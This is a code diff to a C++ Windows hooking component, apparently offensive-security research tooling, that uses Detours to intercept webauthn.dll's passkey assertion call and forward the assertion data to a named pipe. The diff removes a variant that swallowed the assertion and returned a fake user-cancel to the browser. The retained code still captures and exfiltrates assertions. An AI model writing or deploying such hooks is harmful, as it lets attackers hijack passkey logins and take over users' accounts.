@@ -12,8 +12,6 @@ namespace SpecterOps::Passkeys::WebAuthnHook
     constexpr const wchar_t* WebAuthnModuleName = L"webauthn.dll";
     constexpr const wchar_t* WebAuthnHookPipeName = LR"(\\.\pipe\WebAuthnHook)";
     constexpr const char* GetAssertionExportName = "WebAuthNAuthenticatorGetAssertion";
-    constexpr const char* FreeAssertionExportName = "WebAuthNFreeAssertion";
-    constexpr HRESULT ForwardedAssertionResult = HRESULT_FROM_WIN32(ERROR_CANCELLED);
 
     using WebAuthNAuthenticatorGetAssertionFn = HRESULT(WINAPI*)(
         HWND hwnd,
@@ -21,14 +19,12 @@ namespace SpecterOps::Passkeys::WebAuthnHook
         WEBAUTHN_CLIENT_DATA* clientData,
         WEBAUTHN_AUTHENTICATOR_GET_ASSERTION_OPTIONS* options,
         WEBAUTHN_ASSERTION** assertion);
-    using WebAuthNFreeAssertionFn = VOID(WINAPI*)(PWEBAUTHN_ASSERTION assertion);
 
     using LoadLibraryWFn = HMODULE(WINAPI*)(LPCWSTR fileName);
     using LoadLibraryExWFn = HMODULE(WINAPI*)(LPCWSTR fileName, HANDLE file, DWORD flags);
 
     // Original API entrypoints that Detours rewrites in place.
     WebAuthNAuthenticatorGetAssertionFn TrueWebAuthNAuthenticatorGetAssertion = nullptr;
-    WebAuthNFreeAssertionFn TrueWebAuthNFreeAssertion = nullptr;
     LoadLibraryWFn TrueLoadLibraryW = ::LoadLibraryW;
     LoadLibraryExWFn TrueLoadLibraryExW = ::LoadLibraryExW;
 
@@ -152,24 +148,6 @@ namespace SpecterOps::Passkeys::WebAuthnHook
                 && bytesWritten == text.size();
         }
 
-        bool TryGetFreeAssertionFunction()
-        {
-            if (TrueWebAuthNFreeAssertion != nullptr)
-            {
-                return true;
-            }
-
-            const HMODULE webAuthnModule = ::GetModuleHandleW(WebAuthnModuleName);
-            if (webAuthnModule == nullptr)
-            {
-                return false;
-            }
-
-            TrueWebAuthNFreeAssertion = reinterpret_cast<WebAuthNFreeAssertionFn>(
-                ::GetProcAddress(webAuthnModule, FreeAssertionExportName));
-            return TrueWebAuthNFreeAssertion != nullptr;
-        }
-
         bool TryForwardAssertionToPipe(
             const WEBAUTHN_CLIENT_DATA* clientData,
             const WEBAUTHN_ASSERTION* assertion)
@@ -220,27 +198,8 @@ namespace SpecterOps::Passkeys::WebAuthnHook
             return result;
         }
 
-        if (!TryGetFreeAssertionFunction())
-        {
-            return result;
-        }
-
-        if (!TryForwardAssertionToPipe(clientData, *assertion))
-        {
-            return result;
-        }
-
-        TrueWebAuthNFreeAssertion(*assertion);
-        *assertion = nullptr;
-
-        // Return ERROR_CANCELLED so the browser treats the operation as user-aborted rather than
-        // exposing the assertion to the JavaScript that triggered it. The actual response has
-        // already been forwarded to the named pipe listener at this point.
-        AppendLog(
-            L"[" + Timestamp() + L"] [pid=" + std::to_wstring(::GetCurrentProcessId())
-            + L" tid=" + std::to_wstring(::GetCurrentThreadId())
-            + L"] Forwarded WebAuthn assertion response to " + std::wstring(WebAuthnHookPipeName) + L".");
-        return ForwardedAssertionResult;
+        TryForwardAssertionToPipe(clientData, *assertion);
+        return result;
     }
 
     HMODULE WINAPI HookLoadLibraryW(LPCWSTR fileName)
@@ -275,8 +234,6 @@ namespace SpecterOps::Passkeys::WebAuthnHook
 
         const auto target = reinterpret_cast<WebAuthNAuthenticatorGetAssertionFn>(
             ::GetProcAddress(webAuthnModule, GetAssertionExportName));
-        const auto freeAssertion = reinterpret_cast<WebAuthNFreeAssertionFn>(
-            ::GetProcAddress(webAuthnModule, FreeAssertionExportName));
         if (target == nullptr)
         {
             ::InterlockedExchange(&g_assertionHookInstalled, 0);
@@ -284,10 +241,6 @@ namespace SpecterOps::Passkeys::WebAuthnHook
         }
 
         TrueWebAuthNAuthenticatorGetAssertion = target;
-        if (freeAssertion != nullptr)
-        {
-            TrueWebAuthNFreeAssertion = freeAssertion;
-        }
 
         if (DetourTransactionBegin() != NO_ERROR)
         {
